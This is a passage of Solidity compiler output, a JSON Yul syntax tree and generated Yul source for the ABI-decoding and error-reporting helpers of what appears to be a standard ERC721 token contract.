:"20346:15:15"},"nodeType":"YulExpressionStatement","src":"20346:15:15"}]},"name":"panic_error_0x12","nodeType":"YulFunctionDefinition","src":"20187:180:15"},{"body":{"nodeType":"YulBlock","src":"20401:152:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"20418:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"20421:77:15","type":"","value":"35408467139433450592217433187231851964531694900788300625387963629091585785856"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"20411:6:15"},"nodeType":"YulFunctionCall","src":"20411:88:15"},"nodeType":"YulExpressionStatement","src":"20411:88:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"20515:1:15","type":"","value":"4"},{"kind":"number","nodeType":"YulLiteral","src":"20518:4:15","type":"","value":"0x22"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"20508:6:15"},"nodeType":"YulFunctionCall","src":"20508:15:15"},"nodeType":"YulExpressionStatement","src":"20508:15:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"20539:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"20542:4:15","type":"","value":"0x24"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"20532:6:15"},"nodeType":"YulFunctionCall","src":"20532:15:15"},"nodeType":"YulExpressionStatement","src":"20532:15:15"}]},"name":"panic_error_0x22","nodeType":"YulFunctionDefinition","src":"20373:180:15"},{"body":{"nodeType":"YulBlock","src":"20587:152:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"20604:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"20607:77:15","type":"","value":"35408467139433450592217433187231851964531694900788300625387963629091585785856"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"20597:6:15"},"nodeType":"YulFunctionCall","src":"20597:88:15"},"nodeType":"YulExpressionStatement","src":"20597:88:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"20701:1:15","type":"","value":"4"},{"kind":"number","nodeType":"YulLiteral","src":"20704:4:15","type":"","value":"0x41"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"20694:6:15"},"nodeType":"YulFunctionCall","src":"20694:15:15"},"nodeType":"YulExpressionStatement","src":"20694:15:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"20725:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"20728:4:15","type":"","value":"0x24"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"20718:6:15"},"nodeType":"YulFunctionCall","src":"20718:15:15"},"nodeType":"YulExpressionStatement","src":"20718:15:15"}]},"name":"panic_error_0x41","nodeType":"YulFunctionDefinition","src":"20559:180:15"},{"body":{"nodeType":"YulBlock","src":"20834:28:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"20851:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"20854:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"20844:6:15"},"nodeType":"YulFunctionCall","src":"20844:12:15"},"nodeType":"YulExpressionStatement","src":"20844:12:15"}]},"name":"revert_error_1b9f4a0a5773e33b91aa01db23bf8c55fce1411167c872835e7fa00a4f17d46d","nodeType":"YulFunctionDefinition","src":"20745:117:15"},{"body":{"nodeType":"YulBlock","src":"20957:28:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"20974:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"20977:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"20967:6:15"},"nodeType":"YulFunctionCall","src":"20967:12:15"},"nodeType":"YulExpressionStatement","src":"20967:12:15"}]},"name":"revert_error_987264b3b1d58a9c7f8255e93e81c77d86d6299019c33110a076957a3e06e2ae","nodeType":"YulFunctionDefinition","src":"20868:117:15"},{"body":{"nodeType":"YulBlock","src":"21080:28:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"21097:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"21100:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"21090:6:15"},"nodeType":"YulFunctionCall","src":"21090:12:15"},"nodeType":"YulExpressionStatement","src":"21090:12:15"}]},"name":"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db","nodeType":"YulFunctionDefinition","src":"20991:117:15"},{"body":{"nodeType":"YulBlock","src":"21203:28:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"21220:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"21223:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"21213:6:15"},"nodeType":"YulFunctionCall","src":"21213:12:15"},"nodeType":"YulExpressionStatement","src":"21213:12:15"}]},"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulFunctionDefinition","src":"21114:117:15"},{"body":{"nodeType":"YulBlock","src":"21285:54:15","statements":[{"nodeType":"YulAssignment","src":"21295:38:15","value":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"21313:5:15"},{"kind":"number","nodeType":"YulLiteral","src":"21320:2:15","type":"","value":"31"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"21309:3:15"},"nodeType":"YulFunctionCall","src":"21309:14:15"},{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"21329:2:15","type":"","value":"31"}],"functionName":{"name":"not","nodeType":"YulIdentifier","src":"21325:3:15"},"nodeType":"YulFunctionCall","src":"21325:7:15"}],"functionName":{"name":"and","nodeType":"YulIdentifier","src":"21305:3:15"},"nodeType":"YulFunctionCall","src":"21305:28:15"},"variableNames":[{"name":"result","nodeType":"YulIdentifier","src":"21295:6:15"}]}]},"name":"round_up_to_mul_of_32","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"21268:5:15","type":""}],"returnVariables":[{"name":"result","nodeType":"YulTypedName","src":"21278:6:15","type":""}],"src":"21237:102:15"},{"body":{"nodeType":"YulBlock","src":"21451:126:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"21473:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"21481:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"21469:3:15"},"nodeType":"YulFunctionCall","src":"21469:14:15"},{"hexValue":"4552433732313a2063616c6c6572206973206e6f7420746f6b656e206f776e65","kind":"string","nodeType":"YulLiteral","src":"21485:34:15","type":"","value":"ERC721: caller is not token owne"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"21462:6:15"},"nodeType":"YulFunctionCall","src":"21462:58:15"},"nodeType":"YulExpressionStatement","src":"21462:58:15"},{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"21541:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"21549:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"21537:3:15"},"nodeType":"YulFunctionCall","src":"21537:15:15"},{"hexValue":"72206f7220617070726f766564","kind":"string","nodeType":"YulLiteral","src":"21554:15:15","type":"","value":"r or approved"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"21530:6:15"},"nodeType":"YulFunctionCall","src":"21530:40:15"},"nodeType":"YulExpressionStatement","src":"21530:40:15"}]},"name":"store_literal_in_memory_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"21443:6:15","type":""}],"src":"21345:232:15"},{"body":{"nodeType":"YulBlock","src":"21689:131:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"21711:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"21719:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"21707:3:15"},"nodeType":"YulFunctionCall","src":"21707:14:15"},{"hexValue":"4552433732313a207472616e7366657220746f206e6f6e204552433732315265","kind":"string","nodeType":"YulLiteral","src":"21723:34:15","type":"","value":"ERC721: transfer to non ERC721Re"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"21700:6:15"},"nodeType":"YulFunctionCall","src":"21700:58:15"},"nodeType":"YulExpressionStatement","src":"21700:58:15"},{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"21779:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"21787:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"21775:3:15"},"nodeType":"YulFunctionCall","src":"21775:15:15"},{"hexValue":"63656976657220696d706c656d656e746572","kind":"string","nodeType":"YulLiteral","src":"21792:20:15","type":"","value":"ceiver implementer"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"21768:6:15"},"nodeType":"YulFunctionCall","src":"21768:45:15"},"nodeType":"YulExpressionStatement","src":"21768:45:15"}]},"name":"store_literal_in_memory_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"21681:6:15","type":""}],"src":"21583:237:15"},{"body":{"nodeType":"YulBlock","src":"21932:118:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"21954:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"21962:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"21950:3:15"},"nodeType":"YulFunctionCall","src":"21950:14:15"},{"hexValue":"4552433732313a207472616e736665722066726f6d20696e636f727265637420","kind":"string","nodeType":"YulLiteral","src":"21966:34:15","type":"","value":"ERC721: transfer from incorrect "}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"21943:6:15"},"nodeType":"YulFunctionCall","src":"21943:58:15"},"nodeType":"YulExpressionStatement","src":"21943:58:15"},{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"22022:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"22030:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"22018:3:15"},"nodeType":"YulFunctionCall","src":"22018:15:15"},{"hexValue":"6f776e6572","kind":"string","nodeType":"YulLiteral","src":"22035:7:15","type":"","value":"owner"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"22011:6:15"},"nodeType":"YulFunctionCall","src":"22011:32:15"},"nodeType":"YulExpressionStatement","src":"22011:32:15"}]},"name":"store_literal_in_memory_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"21924:6:15","type":""}],"src":"21826:224:15"},{"body":{"nodeType":"YulBlock","src":"22162:117:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"22184:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"22192:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"22180:3:15"},"nodeType":"YulFunctionCall","src":"22180:14:15"},{"hexValue":"4552433732313a207472616e7366657220746f20746865207a65726f20616464","kind":"string","nodeType":"YulLiteral","src":"22196:34:15","type":"","value":"ERC721: transfer to the zero add"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"22173:6:15"},"nodeType":"YulFunctionCall","src":"22173:58:15"},"nodeType":"YulExpressionStatement","src":"22173:58:15"},{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"22252:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"22260:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"22248:3:15"},"nodeType":"YulFunctionCall","src":"22248:15:15"},{"hexValue":"72657373","kind":"string","nodeType":"YulLiteral","src":"22265:6:15","type":"","value":"ress"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"22241:6:15"},"nodeType":"YulFunctionCall","src":"22241:31:15"},"nodeType":"YulExpressionStatement","src":"22241:31:15"}]},"name":"store_literal_in_memory_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"22154:6:15","type":""}],"src":"22056:223:15"},{"body":{"nodeType":"YulBlock","src":"22391:69:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"22413:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"22421:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"22409:3:15"},"nodeType":"YulFunctionCall","src":"22409:14:15"},{"hexValue":"4552433732313a20617070726f766520746f2063616c6c6572","kind":"string","nodeType":"YulLiteral","src":"22425:27:15","type":"","value":"ERC721: approve to caller"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"22402:6:15"},"nodeType":"YulFunctionCall","src":"22402:51:15"},"nodeType":"YulExpressionStatement","src":"22402:51:15"}]},"name":"store_literal_in_memory_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"22383:6:15","type":""}],"src":"22285:175:15"},{"body":{"nodeType":"YulBlock","src":"22572:122:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"22594:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"22602:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"22590:3:15"},"nodeType":"YulFunctionCall","src":"22590:14:15"},{"hexValue":"4552433732313a2061646472657373207a65726f206973206e6f742061207661","kind":"string","nodeType":"YulLiteral","src":"22606:34:15","type":"","value":"ERC721: address zero is not a va"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"22583:6:15"},"nodeType":"YulFunctionCall","src":"22583:58:15"},"nodeType":"YulExpressionStatement","src":"22583:58:15"},{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"22662:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"22670:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"22658:3:15"},"nodeType":"YulFunctionCall","src":"22658:15:15"},{"hexValue":"6c6964206f776e6572","kind":"string","nodeType":"YulLiteral","src":"22675:11:15","type":"","value":"lid owner"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"22651:6:15"},"nodeType":"YulFunctionCall","src":"22651:36:15"},"nodeType":"YulExpressionStatement","src":"22651:36:15"}]},"name":"store_literal_in_memory_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"22564:6:15","type":""}],"src":"22466:228:15"},{"body":{"nodeType":"YulBlock","src":"22806:68:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"22828:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"22836:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"22824:3:15"},"nodeType":"YulFunctionCall","src":"22824:14:15"},{"hexValue":"4552433732313a20696e76616c696420746f6b656e204944","kind":"string","nodeType":"YulLiteral","src":"22840:26:15","type":"","value":"ERC721: invalid token ID"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"22817:6:15"},"nodeType":"YulFunctionCall","src":"22817:50:15"},"nodeType":"YulExpressionStatement","src":"22817:50:15"}]},"name":"store_literal_in_memory_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"22798:6:15","type":""}],"src":"22700:174:15"},{"body":{"nodeType":"YulBlock","src":"22986:114:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"23008:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"23016:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"23004:3:15"},"nodeType":"YulFunctionCall","src":"23004:14:15"},{"hexValue":"4552433732313a20617070726f76616c20746f2063757272656e74206f776e65","kind":"string","nodeType":"YulLiteral","src":"23020:34:15","type":"","value":"ERC721: approval to current owne"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"22997:6:15"},"nodeType":"YulFunctionCall","src":"22997:58:15"},"nodeType":"YulExpressionStatement","src":"22997:58:15"},{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"23076:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"23084:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"23072:3:15"},"nodeType":"YulFunctionCall","src":"23072:15:15"},{"hexValue":"72","kind":"string","nodeType":"YulLiteral","src":"23089:3:15","type":"","value":"r"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"23065:6:15"},"nodeType":"YulFunctionCall","src":"23065:28:15"},"nodeType":"YulExpressionStatement","src":"23065:28:15"}]},"name":"store_literal_in_memory_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"22978:6:15","type":""}],"src":"22880:220:15"},{"body":{"nodeType":"YulBlock","src":"23212:142:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"23234:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"23242:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"23230:3:15"},"nodeType":"YulFunctionCall","src":"23230:14:15"},{"hexValue":"4552433732313a20617070726f76652063616c6c6572206973206e6f7420746f","kind":"string","nodeType":"YulLiteral","src":"23246:34:15","type":"","value":"ERC721: approve caller is not to"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"23223:6:15"},"nodeType":"YulFunctionCall","src":"23223:58:15"},"nodeType":"YulExpressionStatement","src":"23223:58:15"},{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"23302:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"23310:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"23298:3:15"},"nodeType":"YulFunctionCall","src":"23298:15:15"},{"hexValue":"6b656e206f776e6572206f7220617070726f76656420666f7220616c6c","kind":"string","nodeType":"YulLiteral","src":"23315:31:15","type":"","value":"ken owner or approved for all"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"23291:6:15"},"nodeType":"YulFunctionCall","src":"23291:56:15"},"nodeType":"YulExpressionStatement","src":"23291:56:15"}]},"name":"store_literal_in_memory_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"23204:6:15","type":""}],"src":"23106:248:15"},{"body":{"nodeType":"YulBlock","src":"23403:79:15","statements":[{"body":{"nodeType":"YulBlock","src":"23460:16:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"23469:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"23472:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"23462:6:15"},"nodeType":"YulFunctionCall","src":"23462:12:15"},"nodeType":"YulExpressionStatement","src":"23462:12:15"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"23426:5:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"23451:5:15"}],"functionName":{"name":"cleanup_t_address","nodeType":"YulIdentifier","src":"23433:17:15"},"nodeType":"YulFunctionCall","src":"23433:24:15"}],"functionName":{"name":"eq","nodeType":"YulIdentifier","src":"23423:2:15"},"nodeType":"YulFunctionCall","src":"23423:35:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"23416:6:15"},"nodeType":"YulFunctionCall","src":"23416:43:15"},"nodeType":"YulIf","src":"23413:63:15"}]},"name":"validator_revert_t_address","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"23396:5:15","type":""}],"src":"23360:122:15"},{"body":{"nodeType":"YulBlock","src":"23528:76:15","statements":[{"body":{"nodeType":"YulBlock","src":"23582:16:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"23591:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"23594:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"23584:6:15"},"nodeType":"YulFunctionCall","src":"23584:12:15"},"nodeType":"YulExpressionStatement","src":"23584:12:15"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"23551:5:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"23573:5:15"}],"functionName":{"name":"cleanup_t_bool","nodeType":"YulIdentifier","src":"23558:14:15"},"nodeType":"YulFunctionCall","src":"23558:21:15"}],"functionName":{"name":"eq","nodeType":"YulIdentifier","src":"23548:2:15"},"nodeType":"YulFunctionCall","src":"23548:32:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"23541:6:15"},"nodeType":"YulFunctionCall","src":"23541:40:15"},"nodeType":"YulIf","src":"23538:60:15"}]},"name":"validator_revert_t_bool","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"23521:5:15","type":""}],"src":"23488:116:15"},{"body":{"nodeType":"YulBlock","src":"23652:78:15","statements":[{"body":{"nodeType":"YulBlock","src":"23708:16:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"23717:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"23720:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"23710:6:15"},"nodeType":"YulFunctionCall","src":"23710:12:15"},"nodeType":"YulExpressionStatement","src":"23710:12:15"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"23675:5:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"23699:5:15"}],"functionName":{"name":"cleanup_t_bytes4","nodeType":"YulIdentifier","src":"23682:16:15"},"nodeType":"YulFunctionCall","src":"23682:23:15"}],"functionName":{"name":"eq","nodeType":"YulIdentifier","src":"23672:2:15"},"nodeType":"YulFunctionCall","src":"23672:34:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"23665:6:15"},"nodeType":"YulFunctionCall","src":"23665:42:15"},"nodeType":"YulIf","src":"23662:62:15"}]},"name":"validator_revert_t_bytes4","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"23645:5:15","type":""}],"src":"23610:120:15"},{"body":{"nodeType":"YulBlock","src":"23779:79:15","statements":[{"body":{"nodeType":"YulBlock","src":"23836:16:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"23845:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"23848:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"23838:6:15"},"nodeType":"YulFunctionCall","src":"23838:12:15"},"nodeType":"YulExpressionStatement","src":"23838:12:15"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"23802:5:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"23827:5:15"}],"functionName":{"name":"cleanup_t_uint256","nodeType":"YulIdentifier","src":"23809:17:15"},"nodeType":"YulFunctionCall","src":"23809:24:15"}],"functionName":{"name":"eq","nodeType":"YulIdentifier","src":"23799:2:15"},"nodeType":"YulFunctionCall","src":"23799:35:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"23792:6:15"},"nodeType":"YulFunctionCall","src":"23792:43:15"},"nodeType":"YulIf","src":"23789:63:15"}]},"name":"validator_revert_t_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"23772:5:15","type":""}],"src":"23736:122:15"}]},"contents":"{\n\n    function abi_decode_available_length_t_bytes_memory_ptr(src, length, end) -> array {\n        array := allocate_memory(array_allocation_size_t_bytes_memory_ptr(length))\n        mstore(array, length)\n        let dst := add(array, 0x20)\n        if gt(add(src, length), end) { revert_error_987264b3b1d58a9c7f8255e93e81c77d86d6299019c33110a076957a3e06e2ae() }\n        copy_calldata_to_memory(src, dst, length)\n    }\n\n    function abi_decode_t_address(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_t_bool(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_bool(value)\n    }\n\n    function abi_decode_t_bytes4(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_bytes4(value)\n    }\n\n    function abi_decode_t_bytes4_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_bytes4(value)\n    }\n\n    // bytes\n    function abi_decode_t_bytes_memory_ptr(offset, end) -> array {\n        if iszero(slt(add(offset, 0x1f), end)) { revert_error_1b9f4a0a5773e33b91aa01db23bf8c55fce1411167c872835e7fa00a4f17d46d() }\n        let length := calldataload(offset)\n        array := abi_decode_available_length_t_bytes_memory_ptr(add(offset, 0x20), length, end)\n    }\n\n    function abi_decode_t_uint256(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_uint256(value)\n    }\n\n    function abi_decode_tuple_t_address(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_decode_tuple_t_addresst_address(headStart, dataEnd) -> value0, value1 {\n        if slt(sub(dataEnd, headStart), 64) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 32\n\n            value1 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_decode_tuple_t_addresst_addresst_uint256(headStart, dataEnd) -> value0, value1, value2 {\n        if slt(sub(dataEnd, headStart), 96) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 32\n\n            value1 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 64\n\n            value2 := abi_decode_t_uint256(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_decode_tuple_t_addresst_addresst_uint256t_bytes_memory_ptr(headStart, dataEnd) -> value0, value1, value2, value3 {\n        if slt(sub(dataEnd, headStart), 128) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 32\n\n            value1 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 64\n\n            value2 := abi_decode_t_uint256(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := calldataload(add(headStart, 96))\n            if gt(offset, 0xffffffffffffffff) { revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() }\n\n            value3 := abi_decode_t_bytes_memory_ptr(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_decode_tuple_t_addresst_bool(headStart, dataEnd) -> value0, value1 {\n        if slt(sub(dataEnd, headStart), 64) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 32\n\n            value1 := abi_decode_t_bool(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_decode_tuple_t_addresst_uint256(headStart, dataEnd) -> value0, value1 {\n        if slt(sub(dataEnd, headStart), 64) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 32\n\n            value1 := abi_decode_t_uint256(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_decode_tuple_t_bytes4(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { 